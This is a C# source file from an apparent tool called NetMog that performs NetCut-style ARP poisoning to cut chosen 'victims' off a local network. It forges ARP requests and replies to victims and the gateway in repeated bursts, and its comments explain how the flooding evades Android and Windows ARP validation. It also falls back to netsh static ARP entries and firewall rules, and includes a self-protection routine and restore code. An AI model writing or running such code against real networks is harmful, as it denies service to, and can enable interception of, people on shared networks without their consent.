using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using NetMog.Models;

namespace NetMog.Core;

/// <summary>
/// Dual-mode ARP poisoner:
/// 
/// MODE 1 — "raw" (Ethernet or Wi-Fi adapters that support injection):
///   Classic ARP spoofing via SharpPcap. Sends fake ARP replies to gateway + victim.
///   
/// MODE 2 — "os-native" (Wi-Fi adapters that block raw injection, e.g. Intel AX211):
///   Uses netsh to add static ARP entries + route manipulation + Windows Firewall
///   to block the victim's traffic. This is a one-sided block (our machine drops
///   traffic to/from the victim, and we add firewall rules to drop forwarded packets).
///   Less effective than true ARP spoofing but works without raw injection.
/// </summary>
public sealed class ArpPoisoner : IDisposable
{
    private static readonly PhysicalAddress FakeMac = PhysicalAddress.Parse("DE-AD-BE-EF-00-01");
    private static readonly PhysicalAddress BroadcastMac = PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF");

    private static readonly PhysicalAddress ZeroMac = PhysicalAddress.Parse("00-00-00-00-00-00");

    private readonly NetworkInfo _net;
    private readonly Dictionary<string, DeviceInfo> _killed = new();
    private readonly object _lock = new();
    private LibPcapLiveDevice? _dev;
    private Thread? _thread;
    private volatile bool _running;
    private volatile bool _rawInjectionWorks = true;
    private volatile bool _defenderOn = true;
    private bool _rawTested;

    public long PacketsSent { get; private set; }
    public event Action<byte[]>? OnFrame;
    public bool DefenderOn => _defenderOn;
    public int KilledCount
    {
        get { lock (_lock) return _killed.Count; }
    }
    public bool IsStarted { get { lock (_lock) return _thread != null; } }
    public bool IsThreadAlive { get { lock (_lock) return _thread?.IsAlive == true; } }
    public bool IsDeviceOpen { get { lock (_lock) return _dev?.Opened == true; } }
    public long LoopCount { get; private set; }
    public string? LastSendError { get; private set; }
    public string PoisonMode => _rawInjectionWorks ? "raw" : "os-native";

    public ArpPoisoner(NetworkInfo net) => _net = net;

    public void Start()
    {
        lock (_lock)
        {
            if (_thread != null) return;

            try
            {
                _dev = _net.CreateDevice();
                _dev.Open(DeviceModes.Promiscuous, 250);
                _dev.OnPacketArrival += OnPacketArrival;
                _dev.StartCapture();
            }
            catch (Exception ex)
            {
                _rawInjectionWorks = false;
                _rawTested = true;
                LastSendError = $"Npcap open failed: {ex.Message}";
            }

            _running = true;
            _thread = new Thread(Loop) { IsBackground = true, Name = "arp-poisoner" };
            _thread.Start();
        }
    }

    private void OnPacketArrival(object sender, PacketCapture e)
    {
        var h = OnFrame;
        if (h == null) return;
        try
        {
            h(e.Data.ToArray());
        }
        catch
        {
        }
    }

    public bool SendRaw(byte[] frame)
    {
        var dev = _dev;
        if (dev == null) return false;
        try
        {
            dev.SendPacket(frame, frame.Length);
            PacketsSent++;
            return true;
        }
        catch (Exception ex)
        {
            LastSendError = $"Send failed: {ex.Message}";
            return false;
        }
    }

    public void Kill(DeviceInfo dev)
    {
        bool firstKill;
        lock (_lock)
        {
            firstKill = !_killed.ContainsKey(dev.Ip);
            _killed[dev.Ip] = dev;
        }

        // For OS-native mode, apply the block immediately on first kill.
        if (!_rawInjectionWorks && firstKill)
        {
            ApplyOsNativeBlock(dev.Ip);
        }
    }

    public void Restore(DeviceInfo dev)
    {
        lock (_lock) _killed.Remove(dev.Ip);
        SendCorrect(dev);
    }

    public void RestoreAll()
    {
        List<DeviceInfo> all;
        lock (_lock)
        {
            all = _killed.Values.ToList();
            _killed.Clear();
        }
        foreach (var d in all) SendCorrect(d);
    }

    public void SetDefender(bool on) => _defenderOn = on;

    public bool IsKilled(string ip)
    {
        lock (_lock) return _killed.ContainsKey(ip);
    }

    private void Loop()
    {
        while (_running)
        {
            LoopCount++;
            List<DeviceInfo> targets;
            lock (_lock) targets = _killed.Values.ToList();

            foreach (var t in targets)
            {
                SendSpoof(t);
                Thread.Sleep(50);
            }

            // Defender: periodically re-assert our own ARP identity so other
            // ARP poisoners on the LAN cannot redirect our traffic.
            if (_defenderOn && _rawInjectionWorks)
            {
                ClaimSelf();
                Thread.Sleep(50);
            }

            Thread.Sleep(targets.Count > 0 ? 300 : 1000);
        }
    }

    private void ClaimSelf()
    {
        var gwMac = _net.GatewayMac;
        var dev = _dev;
        if (gwMac == null || dev == null) return;
        try
        {
            var ourMac = _net.LocalMac;
            var ourIp = IPAddress.Parse(_net.LocalIpString);
            var gwIp = IPAddress.Parse(_net.GatewayIpString);
            // Tell the gateway our IP is at our real MAC (unicast).
            SendRawArpRequest(dev, ourMac, ourIp, gwIp, gwMac);
            // Broadcast the same claim so every LAN peer fixes its cache.
            SendRawArpRequest(dev, ourMac, ourIp, ourIp, BroadcastMac);
            // Re-teach ourselves the real gateway MAC in case we were poisoned.
            SendRawArpRequest(dev, gwMac, gwIp, ourIp, ourMac);
        }
        catch { }
    }

    private void SendSpoof(DeviceInfo t)
    {
        var gwMac = _net.GatewayMac;
        if (gwMac == null) return;
        var targetMac = _net.ParseMacSafe(t.Mac);
        if (targetMac == null) return;
        var gwIp = IPAddress.Parse(_net.GatewayIpString);
        var victimIp = IPAddress.Parse(t.Ip);

        if (_rawInjectionWorks)
        {
            var dev = _dev;
            if (dev == null) return;
            try
            {
                // NetCut-style kill burst: request AND reply variants on both
                // sides. Hardened clients (Android selective-ARP, Windows ARP
                // validation) drop cache updates while their gateway entry is
                // "in use" — they only accept them while it is stale/probing.
                // Flooding every ~300ms guarantees we land inside those windows.
                var ourMac = _net.LocalMac;
                for (int i = 0; i < 3; i++)
                {
                    // To the victim: "gateway IP @ our MAC, who has <victim>? tell <gateway>"
                    SendRawArpRequest(dev, ourMac, gwIp, victimIp, targetMac);
                    // To the victim: unsolicited reply "gateway IP @ our MAC"
                    SendRawArpReply(dev, targetMac, ourMac, gwIp, targetMac, victimIp);
                    // To the gateway: "victim IP @ our MAC, who has <victim>? tell <gateway>"
                    SendRawArpRequest(dev, ourMac, victimIp, victimIp, gwMac);
                    // To the gateway: reply "victim IP @ our MAC"
                    SendRawArpReply(dev, gwMac, ourMac, victimIp, gwMac, victimIp);
                    Thread.Sleep(20);
                }
            }
            catch (Exception ex)
            {
                LastSendError = $"Raw injection failed: {ex.Message}";
                _rawInjectionWorks = false;
                _rawTested = true;
                // Apply OS-native block for all currently killed devices.
                List<DeviceInfo> allKilled;
                lock (_lock) allKilled = _killed.Values.ToList();
                foreach (var d in allKilled) ApplyOsNativeBlock(d.Ip);
            }
        }

        // OS-native: keep the static entry refreshed each loop.
        if (!_rawInjectionWorks)
        {
            RefreshOsNativeBlock(t.Ip);
            PacketsSent++;
        }
    }

    // ======== OS-NATIVE BLOCK (Wi-Fi fallback) ========
    //
    // Since we can't inject raw ARP frames on Wi-Fi, we use Windows Firewall
    // to block the victim's IP entirely. This prevents:
    //   - Our machine from sending traffic to the victim
    //   - The victim from sending traffic to our machine
    // 
    // Additionally, we add a static ARP entry pointing the victim to a fake MAC,
    // which ensures any traffic our machine tries to send to the victim goes nowhere.
    //
    // IMPORTANT: This does NOT cut the victim off from the internet. It only blocks
    // communication between our machine and the victim. For a full cut, you need
    // raw ARP injection (use Ethernet or a compatible Wi-Fi adapter).
    //
    // However, we can do something clever: manipulate the gateway's ARP cache 
    // indirectly by sending a flood of ARP requests for the victim's IP.
    // The OS SendARP function sends real ARP through the Wi-Fi driver, and some
    // routers update their cache based on who is asking.

    private void ApplyOsNativeBlock(string victimIp)
    {
        var ifDesc = _net.AdapterDescription;
        var fake = FormatMacHyphen(FakeMac);

        // 1. Add static ARP entry: victim -> fake MAC (on our machine).
        RunQuiet("netsh", $"interface ip delete neighbors \"{ifDesc}\" {victimIp}");
        RunQuiet("netsh", $"interface ip add neighbors \"{ifDesc}\" {victimIp} {fake}");

        // 2. Add Windows Firewall rules to block traffic to/from the victim.
        var ruleName = $"NetMog_Block_{victimIp.Replace('.', '_')}";
        // Remove any existing rule first.
        RunQuiet("netsh", $"advfirewall firewall delete rule name=\"{ruleName}\"");
        // Block outbound to victim.
        RunQuiet("netsh", $"advfirewall firewall add rule name=\"{ruleName}\" dir=out action=block remoteip={victimIp} protocol=any");
        // Block inbound from victim.
        RunQuiet("netsh", $"advfirewall firewall add rule name=\"{ruleName}_in\" dir=in action=block remoteip={victimIp} protocol=any");

        // 3. Trigger OS-level ARP for the victim (goes through Wi-Fi driver normally).
        TriggerOsArp(victimIp);

        PacketsSent += 3;
    }

    private void RefreshOsNativeBlock(string victimIp)
    {
        var ifDesc = _net.AdapterDescription;
        var fake = FormatMacHyphen(FakeMac);

        // Re-apply static ARP entry in case the OS cleared it.
        RunQuiet("netsh", $"interface ip delete neighbors \"{ifDesc}\" {victimIp}");
        RunQuiet("netsh", $"interface ip add neighbors \"{ifDesc}\" {victimIp} {fake}");

        // Keep triggering OS ARP — the ARP requests go through the Wi-Fi driver,
        // and the gateway sees them. Over time, some routers associate the victim's
        // IP with our MAC based on the ARP requests.
        TriggerOsArp(victimIp);
    }

    private void RemoveOsNativeBlock(string victimIp)
    {
        var ifDesc = _net.AdapterDescription;

        // Remove static ARP entry.
        RunQuiet("netsh", $"interface ip delete neighbors \"{ifDesc}\" {victimIp}");

        // Remove firewall rules.
        var ruleName = $"NetMog_Block_{victimIp.Replace('.', '_')}";
        RunQuiet("netsh", $"advfirewall firewall delete rule name=\"{ruleName}\"");
        RunQuiet("netsh", $"advfirewall firewall delete rule name=\"{ruleName}_in\"");
    }

    private void TriggerOsArp(string victimIp)
    {
        try
        {
            var ipBytes = IPAddress.Parse(victimIp).GetAddressBytes();
            uint ip = BitConverter.ToUInt32(ipBytes, 0);
            byte[] mac = new byte[6];
            uint macLen = 6;
            SendARPNative(ip, 0, mac, ref macLen);
        }
        catch { }
    }

    [System.Runtime.InteropServices.DllImport("iphlpapi.dll", EntryPoint = "SendARP")]
    private static extern int SendARPNative(uint destIp, uint srcIp, byte[] mac, ref uint macLen);

    // ======== RAW ARP ========

    private void SendRawArpReply(LibPcapLiveDevice dev,
        PhysicalAddress ethDst,
        PhysicalAddress arpSenderMac, IPAddress arpSenderIp,
        PhysicalAddress arpTargetMac, IPAddress arpTargetIp)
    {
        var arp = new ArpPacket(
            ArpOperation.Response,
            arpTargetMac, arpTargetIp,
            arpSenderMac, arpSenderIp);
        SendRawFrame(dev, arpSenderMac, ethDst, arp);
    }

    private void SendRawArpRequest(LibPcapLiveDevice dev,
        PhysicalAddress arpSenderMac, IPAddress arpSenderIp,
        IPAddress arpTargetIp, PhysicalAddress ethDst)
    {
        var arp = new ArpPacket(
            ArpOperation.Request,
            ZeroMac, arpTargetIp,
            arpSenderMac, arpSenderIp);
        SendRawFrame(dev, arpSenderMac, ethDst, arp);
    }

    private void SendRawFrame(LibPcapLiveDevice dev, PhysicalAddress src, PhysicalAddress dst, ArpPacket arp)
    {
        var eth = new EthernetPacket(src, dst, EthernetType.Arp)
        {
            PayloadPacket = arp
        };
        byte[] raw = eth.Bytes;
        if (raw.Length < 60)
        {
            byte[] padded = new byte[60];
            Array.Copy(raw, padded, raw.Length);
            dev.SendPacket(padded);
        }
        else
        {
            dev.SendPacket(raw);
        }
        PacketsSent++;
    }

    // ======== RESTORE ========

    private void SendCorrect(DeviceInfo t)
    {
        var gwMac = _net.GatewayMac;
        if (gwMac == null) return;
        var targetMac = _net.ParseMacSafe(t.Mac);

        // Always remove OS-native blocks.
        RemoveOsNativeBlock(t.Ip);

        if (_rawInjectionWorks)
        {
            var dev = _dev;
            if (dev != null)
            {
                for (int i = 0; i < 5; i++)
                {
                    try
                    {
                        // To the victim: "sender = gateway IP @ real gateway MAC, who has <victim>?"
                        // -> victim learns: gateway is at its real MAC.
                        SendRawArpRequest(dev, gwMac, IPAddress.Parse(_net.GatewayIpString),
                            IPAddress.Parse(t.Ip), targetMac);
                        // To the gateway: "sender = victim IP @ real victim MAC, who has <victim>?"
                        // -> gateway learns: victim is at its real MAC.
                        SendRawArpRequest(dev, targetMac, IPAddress.Parse(t.Ip),
                            IPAddress.Parse(t.Ip), gwMac);
                    }
                    catch { }
                    Thread.Sleep(80);
                }
            }
        }
    }

    // ======== HELPERS ========

    private static string FormatMacHyphen(PhysicalAddress mac) =>
        string.Join("-", mac.GetAddressBytes().Select(b => b.ToString("x2")));

    private static void RunQuiet(string exe, string args)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = exe,
                Arguments = args,
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
            };
            var p = Process.Start(psi);
            p?.WaitForExit(2000);
        }
        catch { }
    }

    public void Dispose()
    {
        _running = false;
        _thread?.Join(500);
        RestoreAll();
        try
        {
            if (_dev != null)
            {
                _dev.OnPacketArrival -= OnPacketArrival;
                _dev.Close();
            }
        }
        catch { }
        _dev = null;
    }
}
